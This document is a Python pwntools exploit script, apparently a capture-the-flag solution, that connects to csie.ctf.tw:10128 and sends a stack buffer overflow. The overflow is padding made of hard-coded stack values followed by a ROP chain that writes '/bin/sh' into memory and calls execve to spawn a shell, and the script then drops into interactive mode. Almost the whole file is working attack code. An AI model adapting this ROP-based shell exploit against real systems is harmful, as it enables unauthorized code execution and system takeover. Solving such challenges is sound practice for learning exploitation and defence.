from pwn import *

r = remote("csie.ctf.tw",10128)

context.arch = 'amd64'

# Buffer Overflow

# 328
offset_len = 0xc420045f80 - 0xc420045e38 

offset = b""
offset += p64(0x0000000000000000)
offset += p64(0x0000000000000000)
offset += p64(0x0000000000000000)
offset += p64(0x0000000000000000)
offset += p64(0x000000c42000e290)
offset += p64(0x000000c420045e18)
offset += p64(0x0000000000000001)
offset += p64(0x00000000004a1200)
offset += p64(0x00000000004d3c60)
offset += p64(0x0000000000000001)
offset += p64(0x0000000000000008)
offset += p64(0x0000000000000010)
offset += p64(0x000000c42000e290)
offset += p64(0x0000000000000000)
offset += p64(0x000000000053f820)
offset += p64(0x0000000000434063)
offset += p64(0x00007ffff7fba000)
offset += p64(0x000000c420045e38)
offset += p64(0x0000000000000020)
offset += p64(0x0000000000000020)
offset += p64(0x000000c42000e001)
offset += p64(0x000000c42000e270)
offset += p64(0x000000c420045f18)
offset += p64(0x000000000040de88)
offset += p64(0x00000000004d41a0)
offset += p64(0x000000c42000c018)
offset += p64(0x00000000004c8ec8)
offset += p64(0x0000000000010000)
offset += p64(0x000000c420070000)
offset += p64(0x0000000000000001)
offset += p64(0x0000000000001000)
offset += p64(0x000000c420070000)
offset += p64(0x0000000000001000)
offset += p64(0x0000000000001000)
offset += p64(0x0000000000000002)
offset += p64(0x0000000000000002)
offset += p64(0x0000000000000000)
offset += p64(0x0000000000000000)
offset += p64(0x0000000000000000)
offset += p64(0x0000000000000001)
offset += p64(0x000000c420045f80)

ret = p64(0x49064c)

data = 0x537e40

# gadgets
pop_rax = 0x404971
pop_rdi = 0x42ed2d
mov_rax_drdi = 0x44ee6f
pop_rdx = 0x4071e5
mov_rsi = 0x44f3ae 

syscall = 0x44f609


# ROPchain :
# rax = 59(0x3b), rsi = 0, rdx = 0, [rdi] = "/bin/sh"

ropchain = flat([pop_rax,"/bin/sh\x00",pop_rdi,data,mov_rax_drdi,pop_rdx,0,pop_rax,0,mov_rsi,pop_rax,59,syscall])

payload = offset + ropchain

r.send(payload)
r.interactive()
